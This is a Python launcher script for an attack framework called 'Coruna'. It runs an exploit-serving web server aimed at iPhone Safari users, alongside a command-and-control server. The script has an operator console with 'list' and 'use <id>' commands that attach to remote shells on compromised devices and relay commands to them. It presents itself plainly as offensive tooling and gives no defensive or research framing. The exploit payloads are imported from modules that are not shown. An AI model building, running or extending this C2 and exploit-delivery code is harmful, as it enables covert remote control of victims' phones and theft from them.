#!/usr/bin/env python3
"""
Entry point - Web server (Coruna exploit) + C2 server.
"""

import asyncio
import os
import signal
import sys

_script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(_script_dir)
if _script_dir not in sys.path:
    sys.path.insert(0, _script_dir)

from core.config_manager import ConfigManager
from web_server.exploit_http_server import ExploiterWebServer
from c2_comms.c2_server import C2Server


async def main():
    config = ConfigManager()
    c2_bind = config.get("c2_bind", "0.0.0.0")
    c2_port = config.get("c2_port", 8080)
    c2_server = C2Server(c2_bind, c2_port)

    web_ip = config.get("web_server_ip", "0.0.0.0")
    web_port = config.get("web_server_port", 80)
    exploits_dir = config.get("exploit_templates_dir", "exploits")
    static_dir = config.get("static_files_dir", "web_server/static")
    web_server = ExploiterWebServer(web_ip, web_port, exploits_dir, static_dir)

    await web_server.start(config)
    c2_task = asyncio.create_task(c2_server.start())

    print("\n[*] Coruna running. Open http://<SERVER_IP>/ in Safari on your iPhone")
    print("[*] Commands: list | use <id> | help | quit\n")

    shutdown_event = asyncio.Event()

    def _signal_handler():
        print("\n[*] Shutdown signal received. Stopping servers...")
        shutdown_event.set()

    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, _signal_handler)
        except (NotImplementedError, RuntimeError):
            pass

    async def run_shell(session):
        """Interactive shell mode for a session."""
        print(f"\n[*] Connected to {session.ip_address} (session {session.id}). Type 'exit' or 'back' to return.\n")
        while not shutdown_event.is_set():
            try:
                cmd = await loop.run_in_executor(None, lambda: input("(shell)> ").strip())
            except (EOFError, KeyboardInterrupt):
                break
            if cmd in ("exit", "back", "quit"):
                print("[*] Returning to main menu.")
                break
            if not cmd:
                continue
            if session.id not in c2_server.active_sessions:
                print("[-] Session terminated.")
                break
            try:
                session.output_buffer.clear()
                await session.send_command(cmd)
                for _ in range(50):
                    await asyncio.sleep(0.1)
                    out = session.get_buffered_output()
                    if out:
                        print(out, end="", flush=True)
            except Exception as e:
                print(f"[-] Error: {e}")
                break

    is_headless = os.environ.get("CORUNA_HEADLESS") in ("1", "true", "yes") or not sys.stdin.isatty()
    if is_headless:
        print("[*] Daemon / non-interactive mode active. Web server and C2 waiting for connections...")
        print("[*] Press Ctrl+C or send SIGTERM to stop.\n")
        try:
            await shutdown_event.wait()
        except (asyncio.CancelledError, KeyboardInterrupt):
            pass
    else:
        while not shutdown_event.is_set():
            try:
                cmd = await loop.run_in_executor(None, lambda: input("(coruna)> ").strip().lower())
            except (EOFError, KeyboardInterrupt):
                break
            if cmd in ("quit", "exit"):
                break
            if cmd in ("help", "h", "?"):
                print("  list       List active sessions (IDs)")
                print("  use <id>   Attach to session shell (e.g., use abc12345)")
                print("  quit       Stop server and exit")
                continue
            if cmd in ("list", "ls", "sessions"):
                for s in c2_server.get_sessions_summary():
                    print(f"  [{s['id']}] {s['ip_address']} {s['connected_at']}")
                if not c2_server.get_sessions_summary():
                    print("  (no active sessions)")
            elif cmd.startswith("use "):
                parts = cmd.split(maxsplit=1)
                sid = parts[1] if len(parts) > 1 else ""
                session = c2_server.get_session_by_id(sid)
                if session:
                    await run_shell(session)
                else:
                    print(f"[-] Session '{sid}' not found. Use 'list' to see IDs.")

    c2_task.cancel()
    try:
        await c2_task
    except asyncio.CancelledError:
        pass
    c2_server.stop()
    await web_server.stop()
    print("[*] Servers shut down successfully.")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
